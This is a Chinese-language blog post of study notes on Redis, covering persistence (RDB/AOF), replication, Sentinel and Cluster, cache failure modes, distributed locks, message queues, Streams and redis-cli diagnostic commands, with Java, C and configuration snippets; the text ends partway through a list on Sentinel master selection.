<p>zset：跳表<br>基本结构类似于一个多层二分链表，但是为了避免插入引起的 O(N) 效率问题，采用了这样的方案：不要求上下相邻两层链表之间的节点个数有严格的对应关系，而是 为每个节点随机出一个层数(level)。比如，一个节点随机出的层数是 3<br>，那么就把它链入到第 1 层到第 3 层这三层链表中。</p>
<hr>
<h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><ol>
<li><p>大量的key设置相同的过期时间不可取，尽量分散随机防止同时失效时涌入大量的请求造成缓存雪崩。或者设置热点数据永远不过期，有更新操作就更新缓存就好了（比如运维更新了首页商品，那你刷下缓存就完事了，不要设置过期时间），电商首页的数据也可以用这个操作，保险。</p>
</li>
<li><p>scan 取代keys 带来的影响：Redis的单线程的。keys指令会导致线程阻塞一段时间，线上服务会停顿，直到指令执行完毕，服务才能恢复。这个时候可以使用scan指令，scan指令可以无阻塞的提取出指定模式的key<br>列表，但是会有一定的重复概率，在客户端做一次去重就可以了，但是整体所花费的时间会比直接用keys指令长。不过，增量式迭代命令也不是没有缺点的：举个例子，使用 SMEMBERS命令可以返回集合键当前包含的所有元素， 但是对于 SCAN 这类增量式迭代命令来说， 因为在对键进行增量式迭代的过程中， 键可能会被修改， 所以增量式迭代命令只能对被返回的元素提供有限的保证 。</p>
</li>
<li><p>异步队列，rpush生产消息，lpop消费消息，如果不sleep的话blpop可以阻塞消息的到来。使用pub&#x2F;sub主题订阅者模式，可以实现 1:N 的消息队列，但该模式在消费者下线的情况下，生产的消息会丢失。</p>
</li>
<li><p>延时队列的实现：使用sortedset，拿时间戳作为score，消息内容作为key调用zadd来生产消息，消费者用zrangebyscore指令获取N秒之前的数据轮询进行处理。</p>
</li>
<li><p>持久化：RDB做镜像全量持久化，AOF做增量持久化。因为RDB会耗费较长时间，不够实时，在停机的时候会导致大量丢失数据，所以需要AOF来配合使用。在redis实例重启时，会使用RDB持久化文件重新构建内存，再使用AOF重放近期的操作指令来实现完整恢复重启之前的状态。其实就类似与全表与日志恢复的补偿措施。</p>
</li>
</ol>
<div class="code-container" data-rel="Markdown"><figure class="iseeu highlight markdown"><table><tr><td class="code"><pre><span class="line">RDB: </span><br><span class="line"></span><br><span class="line">优点：</span><br><span class="line">他会生成多个数据文件，每个数据文件分别都代表了某一时刻Redis</span><br><span class="line">里面的数据，这种方式，有没有觉得很适合做冷备，完整的数据运维设置定时任务，定时同步到远端的服务器，比如阿里的云服务，这样一旦线上挂了，你想恢复多少分钟之前的数据，就去远端拷贝一份之前的数据就好了。</span><br><span class="line"></span><br><span class="line">RDB对Redis的性能影响非常小，是因为在同步数据的时候他只是fork了一个子进程去做持久化的，而且他在数据恢复的时候速度比AOF来的快。</span><br><span class="line"></span><br><span class="line">缺点：</span><br><span class="line">RDB都是快照文件，都是默认五分钟甚至更久的时间才会生成一次，这意味着你这次同步到下次同步这中间五分钟的数据都很可能全部丢失掉。AOF则最多丢一秒的数据，数据完整性上高下立判。</span><br><span class="line"></span><br><span class="line">还有就是RDB在生成数据快照的时候，如果文件很大，客户端可能会暂停几毫秒甚至几秒，你公司在做秒杀的时候他刚好在这个时候fork了一个子进程去生成一个大快照，哦豁，出大问题。</span><br><span class="line"></span><br><span class="line">AOF</span><br><span class="line"></span><br><span class="line">优点：</span><br><span class="line">上面提到了，RDB五分钟一次生成快照，但是AOF是一秒一次去通过一个后台的线程fsync操作，那最多丢这一秒的数据。</span><br><span class="line"></span><br><span class="line">AOF在对日志文件进行操作的时候是以append-only的方式去写的，他只是追加的方式写数据，自然就少了很多磁盘寻址的开销了，写入性能惊人，文件也不容易破损。</span><br><span class="line"></span><br><span class="line">AOF的日志是通过一个叫非常可读的方式记录的，这样的特性就适合做灾难性数据误删除的紧急恢复了，比如公司的实习生通过flushall清空了所有的数据，只要这个时候后台重写还没发生，你马上拷贝一份AOF日志文件，把最后一条flushall命令删了就完事了。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">缺点：</span><br><span class="line">一样的数据，AOF文件比RDB还要大。</span><br><span class="line"></span><br><span class="line">AOF开启后，Redis支持写的QPS会比RDB支持写的要低，他不是每秒都要去异步刷新一次日志嘛fsync，当然即使这样性能还是很高，我记得ElasticSearch也是这样的，异步刷新缓存区的数据去持久化，为啥这么做呢，不直接来一条怼一条呢，那我会告诉你这样性能可能低到没办法用的，大家可以思考下为啥哟。</span><br><span class="line"></span><br><span class="line">综上：出事第一时间用RDB恢复，然后AOF做数据补全</span><br></pre></td></tr></table></figure></div>

<ol start="6">
<li><p>sync：持久化时的断点可能造成影响，所以需要定时 sync，可以 1 s 执行一次，这样最多丢失 1s 的数据。</p>
</li>
<li><p>RDB 原理： fork(Linux 子进程的那个 fork)&amp; copy on write</p>
</li>
<li><p><strong>pipeline</strong> : 可以将多次IO往返的时间缩减为一次，前提是pipeline执行的指令之间没有因果相关性。使用redis-benchmark进行压测的时候可以发现影响redis的QPS峰值的一个重要因素是pipeline<br>批次指令的数目。</p>
</li>
<li><p><strong>同步机制</strong> : Redis可以使用主从同步，从从同步。第一次同步时，主节点做一次bgsave，并同时将后续修改操作记录到内存buffer，待完成后将RDB文件全量同步到复制节点，复制节点接受完成后将RDB<br>镜像加载到内存。加载完成后，再通知主节点将期间修改的操作记录同步到复制节点进行重放就完成了同步过程。后续的增量数据通过AOF日志同步即可，有点类似数据库的binlog。</p>
</li>
<li><p>集群：</p>
<ul>
<li>Redis Sentinal 着眼于高可用，在master宕机时会自动将slave提升为master，继续提供服务。</li>
<li>Redis Cluster 着眼于扩展性，在单个redis内存不足时，使用Cluster进行分片存储。</li>
</ul>
</li>
<li><p>缓存穿透：构建不存在于缓存和数据库的 key 发起攻击。解决方案是用参数校验比如分页大小不要没个限制之类的，或者 bloom 过滤，不存在就设置空对象到缓存去，同时给这个key一个较短的过期时间。</p>
</li>
<li><p>缓存击穿：极度热点的 key 失效的瞬间。 解决方案：不要过期或者加个互斥锁。</p>
</li>
</ol>
<hr>
<p>事前：Redis 高可用，主从+哨兵，Redis cluster，避免全盘崩溃。</p>
<p>事中：本地 ehcache 缓存 + Hystrix 限流+降级，避免MySQL被打死。</p>
<p>事后：Redis 持久化 RDB+AOF，一旦重启，自动从磁盘上加载数据，快速恢复缓存数据。</p>
<hr>
<h3 id="集群实例"><a href="#集群实例" class="headerlink" title="集群实例"></a>集群实例</h3><ol>
<li><p>我们用到了集群的部署方式也就是Redis cluster，并且是主从同步读写分离，类似Mysql的主从同步，Redis cluster 支撑 N 个 Redis master node，每个master node都可以挂载多个 slave node。<br>这样整个 Redis 就可以横向扩容了。如果你要支撑更大数据量的缓存，那就横向扩容更多的 master 节点，每个 master 节点就能存放更多的数据了。</p>
</li>
<li><p>数据持久化，持久化的话是Redis高可用中比较重要的一个环节，因为Redis数据在内存的特性，持久化必须得有，我了解到的持久化是有两种方式的。</p>
<ul>
<li>RDB：RDB 持久化机制，是对 Redis 中的数据执行周期性的持久化。</li>
<li>AOF：AOF 机制对每条写入命令作为日志，以 append-only 的模式写入一个日志文件中，因为这个模式是只追加的方式，所以没有任何磁盘寻址的开销，所以很快，有点像Mysql中的binlog。</li>
<li>两种方式都可以把Redis内存中的数据持久化到磁盘上，然后再将这些数据备份到别的地方去，RDB更适合做冷备，AOF<br>更适合做热备，比如我杭州的某电商公司有这两个数据，我备份一份到我杭州的节点，再备份一个到上海的，就算发生无法避免的自然灾害，也不会两个地方都一起挂吧，这灾备也就是异地容灾，地球毁灭他没办法。<blockquote>
<p>tip：两种机制全部开启的时候，Redis在重启的时候会默认使用AOF去重新构建数据，因为AOF的数据是比RDB更完整的。</p>
</blockquote>
</li>
</ul>
</li>
<li><p>哨兵组件的功能</p>
<ul>
<li>集群监控：负责监控 Redis master 和 slave 进程是否正常工作。</li>
<li>消息通知：如果某个 Redis 实例有故障，那么哨兵负责发送消息作为报警通知给管理员。</li>
<li>故障转移：如果 master node 挂掉了，会自动转移到 slave node 上。</li>
<li>配置中心：如果故障转移发生了，通知 client 客户端新的 master 地址。</li>
</ul>
</li>
<li><p>读写分离的数据同步方案：启动一台slave 的时候，他会发送一个psync命令给master ，如果是这个slave第一次连接到master，他会触发一个全量复制。master就会启动一个线程，生成RDB快照，还会把新的写请求都缓存在内存中，RDB文件生成后，master会将这个RDB发送给slave的，slave拿到之后做的第一件事情就是写进本地的磁盘，然后加载进内存，然后master会把内存里面缓存的那些新命名都发给slave。</p>
</li>
<li><p>Linked hash map 实现 LRU 缓存，accessOrder 的实现就是 move node to the last</p>
</li>
<li><p>关于 key 的失效： 定期删除和惰性删除，如果不能满足这两种那就只有缓存淘汰了。淘汰的策略有这些：<a class="link"   href="https://redis.io/topics/lru-cache" >Cache invalidation<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</li>
</ol>
<h3 id="分布式问题"><a href="#分布式问题" class="headerlink" title="分布式问题"></a>分布式问题</h3><ol>
<li><p>多个系统同时操作（并发）Redis带来的数据问题：</p>
<ol>
<li><p>某个时刻，多个系统实例都去更新某个 key。可以基于 Zookeeper 实现分布式锁。每个系统通过 Zookeeper 获取分布式锁，确保同一时间，只能有一个系统实例在操作某个 Key，别人都不允许读和写。</p>
</li>
<li><p>你要写入缓存的数据，都是从 MySQL 里查出来的，都得写入 MySQL 中，写入 MySQL 中的时候必须保存一个时间戳，从 MySQL 查出来的时候，时间戳也查出来。</p>
</li>
<li><p>每次要写之前，先判断一下当前这个 Value 的时间戳是否比缓存里的 Value 的时间戳要新。如果是的话，那么可以写，否则，就不能用旧的数据覆盖新的数据。 感觉有点像cas</p>
</li>
</ol>
</li>
<li><p>缓存与数据库双存储双写，你只要是双写，就一定会有数据一致性的问题，这个时候一般是取舍，如果允许缓存可以稍微的跟数据库偶尔有不一致的情况，也就是说如果你的系统不是严格要求 “缓存+数据库” 必须保持一致性的话，最好不要做这个方案，即：读请求和写请求串行化，串到一个内存队列里去。串行的问题不用说自然就是效率问题，拉垮性能。</p>
</li>
</ol>
<h3 id="线程模型"><a href="#线程模型" class="headerlink" title="线程模型"></a>线程模型</h3><p>Redis 内部使用文件事件处理器 file event handler，这个文件事件处理器是单线程的，所以 Redis 才叫做单线程的模型。它采用 IO 多路复用机制同时监听多个 Socket，根据 Socket 上的事件来选择对应的事件处理器进行处理。<br>   文件事件处理器的结构包含 4 个部分：</p>
<ul>
<li>多个 Socket</li>
<li>IO 多路复用程序</li>
<li>文件事件分派器</li>
<li>事件处理器（连接应答处理器、命令请求处理器、命令回复处理器）</li>
</ul>
<p>多个 Socket 可能会并发产生不同的操作，每个操作对应不同的文件事件，但是 IO 多路复用程序会监听多个 Socket，会将 Socket 产生的事件放入队列中排队，事件分派器每次从队列中取出一个事件，把该事件交给对应的事件处理器进行处理。</p>
<h3 id="秒杀系统设计"><a href="#秒杀系统设计" class="headerlink" title="秒杀系统设计"></a>秒杀系统设计</h3><h4 id="预览"><a href="#预览" class="headerlink" title="预览"></a>预览</h4><ol>
<li><p>秒杀也建个微服务，对应的秒杀库</p>
</li>
<li><p>高可用： Redis集群，主从同步、读写分离，我们还搞点哨兵，开启持久化</p>
</li>
<li><p>Nginx 负载均衡打 tomcat 群</p>
</li>
<li><p>资源静态化，能放 CDN 就放</p>
</li>
<li><p>Button loading or disabled</p>
</li>
<li><p>后端限流</p>
<ul>
<li>阿里的Sentinel、Hystrix</li>
<li>库存预热：加载到 redis 中，配合 lua</li>
</ul>
</li>
<li><p>限流&amp;降级&amp;熔断&amp;隔离。限流，顶不住就挡一部分出去但是不能说不行，降级，降级了还是被打挂了，熔断，至少不要影响别的系统，隔离，你本身就独立的，但是你会调用其他的系统嘛，你快不行了你别拖累兄弟们啊。</p>
</li>
<li><p>削峰填谷： 上 mq</p>
</li>
</ol>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/07/19/redis/%E7%A7%92%E6%9D%80%E6%9E%B6%E6%9E%84.png"
                      class="" title="秒杀架构"
                >

<h4 id="全栈"><a href="#全栈" class="headerlink" title="全栈"></a>全栈</h4><ol>
<li><p>Node js</p>
<ul>
<li><p>Master-Worker 模式，Node 提供了 child_process 模块，或者说 cluster 模块也行，可以利用 child_process 模块直接创建子进程。fork的目的是为了利用 cpu 资源</p>
</li>
<li><p>句柄传递去掉主进程代理，Egg.js 将它们放到了一个单独的进程上去执行，这个进程就叫 Agent Worker，简称 Agent，专门用来处理一些公共事务</p>
</li>
</ul>
</li>
</ol>
<h3 id="Redis-命令学习"><a href="#Redis-命令学习" class="headerlink" title="Redis 命令学习"></a>Redis 命令学习</h3><ol>
<li><p>大key检查： <code>redis-cli --bigkeys -i 0.01</code></p>
</li>
<li><p>模块采样，查看高频访问 <code>redis-cli --host 192.168.x.x --port 6379 monitor</code></p>
</li>
<li><p>时延查询 <code>redis-cli --host 192.168.x.x --port 6379 --latency</code>不仅是物理网络的时延，还和当前的 Redis 主线程是否忙碌有关。如果你发现 Unix 的 ping 指令时延很小，而 Redis 的时延很大，那说明 Redis 服务器在执行指令时有微弱卡顿。</p>
</li>
<li><p>将远程的 Redis 实例备份到本地机器，远程服务器会执行一次bgsave操作，然后将 rdb 文件传输到客户端。<code>./redis-cli --host 192.168.x.x --port 6379 --rdb ./user.rdb</code></p>
</li>
<li><p>观察主从服务器之间都同步了那些数据，可以使用 redis-cli 模拟从库 <code>./redis-cli --host 192.168.x.x --port 6379 --slave</code> 从库连上主库的第一件事是全量同步，所以看到上面的指令卡顿这很正常，待首次全量同步完成后，就会输出增量的 aof 日志。</p>
</li>
<li><p>更新缓存时建议直接删缓存，如果没有那么从数据库取</p>
<ul>
<li>如果先走数据库，后操作缓存（CacheAsidePattern）存在缓存删除失败的情况，处理方案：在高并发下表现优异，在原子性被破坏时表现不如意<ul>
<li>将需要删除的key发送到消息队列中 </li>
<li>自己消费消息，获得需要删除的key</li>
<li>不断重试删除操作，直到成功</li>
</ul>
</li>
<li>先删除缓存，再更新数据库：在高并发下表现不如意，在原子性被破坏时表现优异<ul>
<li>将操作积压到队列里进行串行化的操作，避免并发带来的问题</li>
</ul>
</li>
</ul>
</li>
</ol>
<h3 id="Redis-实现消息队列"><a href="#Redis-实现消息队列" class="headerlink" title="Redis 实现消息队列"></a>Redis 实现消息队列</h3><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">MessageListener</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Callback for processing received objects through Redis.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> message message must not be &#123;<span class="doctag">@literal</span> null&#125;.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> pattern pattern matching the channel (if specified) - can be &#123;<span class="doctag">@literal</span> null&#125;.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">onMessage</span><span class="params">(Message message, <span class="meta">@Nullable</span> <span class="type">byte</span>[] pattern)</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Class encapsulating a Redis message body and its properties.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Costin Leau</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Christoph Strobl</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Message</span> <span class="keyword">extends</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Returns the body (or the payload) of the message.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span> message body. Never &#123;<span class="doctag">@literal</span> null&#125;.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">byte</span>[] getBody();</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Returns the channel associated with the message.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span> message channel. Never &#123;<span class="doctag">@literal</span> null&#125;.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">byte</span>[] getChannel();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">RedisTemplate.convertAndSend(chanenl, message)</span><br></pre></td></tr></table></figure></div>

<ol>
<li><p>redis队列监听器的监听机制是：使用一个线程监听队列，队列有未消费的消息则取出消息并生成一个新的线程来消费消息。如果你还记得，我开头说的是由于redis单线程特性，因此我们用它来做消息队列，但是如果监听器每次接受一个消息就生成新的线程来消费信息的话，这样就完全没有使用到redis的单线程特性，同时还会产生线程安全问题。</p>
</li>
<li><p>一个通道只有一个消费者的解决办法：最简单的办法莫过于为onMessage<br>()方法加锁，这样简单粗暴却很有用，不过这种方式无法控制队列监听的速率，且无限制的创造线程最终会导致系统资源被占光。解决方案：RedisMessageListenerContainer类中有一个方法setTaskExecutor<br>(Executor taskExecutor)可以为监听容器配置线程池。配置线程池以后，所有的线程都会由该线程池产生，由此，我们可以通过调节线程池来控制队列监听的速率。</p>
</li>
<li><p>上锁样例</p>
</li>
</ol>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> RedisLockRegistry <span class="title function_">redisLockRegistry</span><span class="params">(RedisConnectionFactory factory)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RedisLockRegistry</span>(factory, <span class="string">&quot;lock-name&quot;</span>, timeForRelease);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RedisListener</span> implement MessageListener&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowrite</span></span><br><span class="line">    <span class="keyword">private</span> RedisLockRegistry redisLockRegistry;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">LOGGER</span> <span class="operator">=</span> LoggerFactory.getLogger(RedisListener.class);</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onMessage</span><span class="params">(Message message,<span class="type">byte</span>[] pattern)</span>&#123;</span><br><span class="line">        Lock lock=redisLockRegistry.obtain(<span class="string">&quot;lock&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            lock.lock(); <span class="comment">//上锁</span></span><br><span class="line">            LOGGER.debug(<span class="string">&quot;从消息通道=&#123;&#125;监听到消息&quot;</span>,<span class="keyword">new</span> <span class="title class_">String</span>(pattern));</span><br><span class="line">            LOGGER.debug(<span class="string">&quot;从消息通道=&#123;&#125;监听到消息&quot;</span>,<span class="keyword">new</span> <span class="title class_">String</span>(message.getChannel()));</span><br><span class="line">            LOGGER.debug(<span class="string">&quot;元消息=&#123;&#125;&quot;</span>,<span class="keyword">new</span> <span class="title class_">String</span>(message.getBody()));</span><br><span class="line">            <span class="comment">// 新建一个用于反序列化的对象，注意这里的对象要和前面配置的一样</span></span><br><span class="line">            <span class="comment">// 因为我前面设置的默认序列化方式为GenericJackson2JsonRedisSerializer</span></span><br><span class="line">            <span class="comment">// 所以这里的实现方式为GenericJackson2JsonRedisSerializer</span></span><br><span class="line">            RedisSerializer serializer=<span class="keyword">new</span> <span class="title class_">GenericJackson2JsonRedisSerializer</span>();</span><br><span class="line">            LOGGER.debug(<span class="string">&quot;反序列化后的消息=&#123;&#125;&quot;</span>,serializer.deserialize(message.getBody()));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            lock.unlock(); <span class="comment">//解锁</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="分布式锁"><a href="#分布式锁" class="headerlink" title="分布式锁"></a>分布式锁</h3><h4 id="常见锁"><a href="#常见锁" class="headerlink" title="常见锁"></a>常见锁</h4><ol>
<li>基于 MySQL 中的锁：MySQL 本身有自带的悲观锁 for update 关键字，也可以自己实现悲观&#x2F;乐观锁来达到目的；但是要</li>
<li>基于 Zookeeper 有序节点：Zookeeper 允许临时创建有序的子节点，这样客户端获取节点列表时，就能够当前子节点列表中的序号判断是否能够获得锁；</li>
<li>基于 Redis 的单线程：由于 Redis 是单线程，所以命令会以串行的方式执行，并且本身提供了像 SETNX(set if not exists) 这样的指令，本身具有互斥性；</li>
</ol>
<h4 id="Redis-锁的释放"><a href="#Redis-锁的释放" class="headerlink" title="Redis 锁的释放"></a>Redis 锁的释放</h4><p>设置时间怕临界区还没结束就放了，所以不要长任务。同时因为这个A超时释放了那期间就会有别的B捡起锁，这样可能A执行完了事务把B的锁给释放了，所以还有种方案就是值设置为随机数，这样删key的时候先看看是不是自己的那个锁，这个方案需要Lua<br>的支持来保证 check 和 delete 为一个原子操作。</p>
<h4 id="Redlock"><a href="#Redlock" class="headerlink" title="Redlock"></a>Redlock</h4><p>服务 A 申请到一把锁之后，如果作为主机的 Redis 宕机了，那么 服务 B 在申请锁的时候就会从从机那里获取到这把锁，为了解决这个问题，Redis 作者提出了一种 RedLock 红锁 的算法 (Redission 同 Jedis)：</p>
<h4 id="分布式锁-1"><a href="#分布式锁-1" class="headerlink" title="分布式锁"></a>分布式锁</h4><p>官方文档也在 SETNX 文档中提到了这样一种思路：把 SETNX 对应 key 的 value 设置为 &lt;current Unix time + lock timeout + 1&gt;，这样在其他客户端访问时就能够自己判断是否能够获取下一个 value 为上述格式的锁了。</p>
<h3 id="持久化"><a href="#持久化" class="headerlink" title="持久化"></a>持久化</h3><ol>
<li><p>redis 库</p>
 <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">redisDb</span> &#123;</span> </span><br><span class="line">    <span class="type">int</span> id;         <span class="comment">// 数据库ID标识</span></span><br><span class="line">    dict *dict;     <span class="comment">// 键空间，存放着所有的键值对              </span></span><br><span class="line">    dict *expires;  <span class="comment">// 过期哈希表，保存着键的过期时间                          </span></span><br><span class="line">    dict *watched_keys; <span class="comment">// 被watch命令监控的key和相应client    </span></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> avg_ttl;  <span class="comment">// 数据库内所有键的平均TTL（生存时间）     </span></span><br><span class="line">&#125; redisDb;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>RDB: 根据修改次数和时间来决定是否调用 bgsave 生成 RDB 文件。RDB不会存储过期键，创建时会进行相应的检查。</p>
 <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">redisServer</span>&#123;</span></span><br><span class="line">   <span class="comment">// 修改计数器</span></span><br><span class="line">   <span class="type">long</span> <span class="type">long</span> dirty;</span><br><span class="line">   </span><br><span class="line">   <span class="comment">// 上一次执行保存的时间</span></span><br><span class="line">   <span class="type">time_t</span> lastsave;</span><br><span class="line">   </span><br><span class="line">   <span class="comment">// 参数的配置</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">saveparam</span> *<span class="title">saveparams</span>;</span></span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure></div>
</li>
<li><p>AOF: 以 redis 序列化协议的方式记录写命令，为了压缩指令集的大小，比如将多个push合为一个push，<code>BGREWRITEAOF</code> 提供类似该命令效果的重写功能配置，重写不依赖于现有的aof<br>文件，而是基于现有库分析拿到重写的指令集数据。类似bgsave fork 子进程重写时会出现不一致的问题，是通过加个临时缓冲区暂存后执行命令解决的。混合模式下 AOF指的是 <strong>自持久化开始到持久化结束</strong> 的这段时间发生的增量 AOF 日志</p>
<ol>
<li>命令追加：命令写入aof_buf缓冲区</li>
<li>文件写入：调用flushAppendOnlyFile函数，考虑是否要将aof_buf缓冲区写入AOF文件中</li>
<li>文件同步：考虑是否将内存缓冲区的数据真正写入到硬盘</li>
</ol>
</li>
<li><p>RDB 执行优先级低于 AOF，此外关于持久化相关的配置：</p>
 <div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="code"><pre><span class="line">redis持久化，两种方式</span><br><span class="line">1、rdb快照方式</span><br><span class="line">2、aof日志方式</span><br><span class="line"></span><br><span class="line">----------rdb快照------------</span><br><span class="line">save 900 1</span><br><span class="line">save 300 10</span><br><span class="line">save 60 10000</span><br><span class="line"></span><br><span class="line">stop-writes-on-bgsave-error yes</span><br><span class="line">rdbcompression yes</span><br><span class="line">rdbchecksum yes</span><br><span class="line">dbfilename dump.rdb</span><br><span class="line">dir /var/rdb/</span><br><span class="line"></span><br><span class="line">-----------Aof的配置-----------</span><br><span class="line">appendonly no # 是否打开 aof日志功能</span><br><span class="line"></span><br><span class="line">appendfsync always #每一个命令都立即同步到aof，安全速度慢</span><br><span class="line">appendfsync everysec</span><br><span class="line">appendfsync no 写入工作交给操作系统，由操作系统判断缓冲区大小，统一写入到aof  同步频率低，速度快</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">no-appendfsync-on-rewrite yes 正在导出rdb快照的时候不要写aof</span><br><span class="line">auto-aof-rewrite-percentage 100</span><br><span class="line">auto-aof-rewrite-min-size 64mb </span><br></pre></td></tr></table></figure></div></li>
<li><p>内核缓冲区成功写入认为已经写入，但到磁盘缓存后再到落盘这中间两步仍然无法避免停电的问题，而Linux 默认30 秒将缓冲区做真正的写提交从而落盘，除此之外 <code>fsync</code> 命令也有相应的效果。</p>
</li>
</ol>
<h3 id="Redis-stream"><a href="#Redis-stream" class="headerlink" title="Redis stream"></a>Redis stream</h3><ol>
<li><p>消息用不同的 ID 来区分</p>
<ul>
<li>Consumer Group：消费者组，可以简单看成记录流状态的一种数据结构。消费者既可以选择使用 XREAD命令进行独立消费，也可以多个消费者同时加入一个消费者组进行 组内消费。同一个消费者组内的消费者共享所有的 Stream 信息，同一条消息只会有一个消费者消费到，这样就可以应用在分布式的应用场景中来保证消息的唯一性。</li>
<li>last_delivered_id：用来表示消费者组消费在 Stream 上 消费位置 的游标信息。每个消费者组都有一个 Stream 内 唯一的名称，消费者组不会自动创建，需要使用 XGROUP CREATE指令来显式创建，并且需要指定从哪一个消息 ID开始消费，用来初始化 last_delivered_id 这个变量。</li>
<li>pending_ids：每个消费者内部都有的一个状态变量，用来表示 已经 被客户端 获取，但是 还没有 ack的消息。记录的目的是为了保证客户端至少消费了消息一次，而不会在网络传输的中途丢失而没有对消息进行处理。如果客户端没有 ack，那么这个变量里面的消息 ID 就会越来越多，一旦某个消息被 ack，它就会对应开始减少。这个变量也被 Redis 官方称为 PEL (Pending Entries List)。</li>
</ul>
</li>
<li><p>Stream 消息太多怎么办？</p>
</li>
</ol>
<p>设置限定消息长度，对老消息进行淘汰</p>
<ol start="3">
<li>PEL 丢失问题：在客户端消费者读取 Stream 消息时，Redis 服务器将消息回复给客户端的过程中，客户端突然断开了连接，消息就丢失了。但是 PEL 里已经保存了发出去的消息 ID，待客户端重新连上之后，可以再次收到 PEL中的消息 ID列表。不过此时 xreadgroup 的起始消息 ID 不能为参数 &gt; ，而必须是任意有效的消息 ID，一般将参数设为 0-0，表示读取所有的 PEL 消息以及自 last_delivered_id 之后的新消息。</li>
</ol>
<h3 id="集群"><a href="#集群" class="headerlink" title="集群"></a>集群</h3><p>[集群参考](<a class="link"   href="https://mp.weixin.qq.com/s?__biz=MzUyMTg0NDA2Ng==&mid=2247484047&idx=1&sn=9b8a62d204ed82805a997878500eef16&chksm" >https://mp.weixin.qq.com/s?__biz=MzUyMTg0NDA2Ng==&amp;mid=2247484047&amp;idx=1&amp;sn=9b8a62d204ed82805a997878500eef16&amp;chksm<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br>&#x3D;f9d5a682cea22f94a10b3e1d302a2b98079a0c4e72049283b3e9a34e541b4a4aa79bc0a0970d&amp;scene&#x3D;21#wechat_redirect)</p>
<h4 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h4><ol>
<li><p>指将一台 Redis 服务器的数据，复制到其他的 Redis 服务器。前者称为 主节点(master)，后者称为 从节点(slave)。且数据的复制是 单向 的，只能由主节点到从节点。Redis主从复制支持 主从同步 和 从从同步 两种，后者是 Redis 后续版本新增的功能，以减轻主节点的同步负担。</p>
</li>
<li><p>三个阶段：准备阶段-数据同步阶段-命令传播阶段。</p>
</li>
</ol>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/07/19/redis/master-slave.png"
                      class="" title="主从复制"
                >

<h4 id="哨兵"><a href="#哨兵" class="headerlink" title="哨兵"></a>哨兵</h4><ol>
<li>主服务器的选择<ul>
<li>在失效主服务器属下的从服务器当中， 那些被标记为主观下线、已断线、或者最后一次回复 PING 命令的时间大于五秒钟的从服务器都会被 淘汰。</li>
<li>在失效主服务器属下的从服务器当中， 那些与失效主服务器连接断开的时长超过 down-after 选项指定的时长十倍的从服务器都会被 淘汰。</li>
